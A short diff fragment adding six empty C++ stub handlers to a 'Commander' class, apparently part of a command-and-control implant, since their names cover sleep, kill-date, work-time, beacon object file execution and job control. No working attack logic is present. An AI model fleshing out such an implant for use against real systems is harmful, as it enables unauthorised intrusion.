+void Commander::CmdProfileSleep(ULONG c, BYTE* d, ULONG s)    { (void)c; (void)d; (void)s; }
+void Commander::CmdProfileKilldate(ULONG c, BYTE* d, ULONG s) { (void)c; (void)d; (void)s; }
+void Commander::CmdProfileWorktime(ULONG c, BYTE* d, ULONG s) { (void)c; (void)d; (void)s; }
+void Commander::CmdExecBof(ULONG c, BYTE* d, ULONG s)         { (void)c; (void)d; (void)s; }
+void Commander::CmdJobList(ULONG c, BYTE* d, ULONG s)         { (void)c; (void)d; (void)s; }
+void Commander::CmdJobKill(ULONG c, BYTE* d, ULONG s)         { (void)c; (void)d; (void)s; }
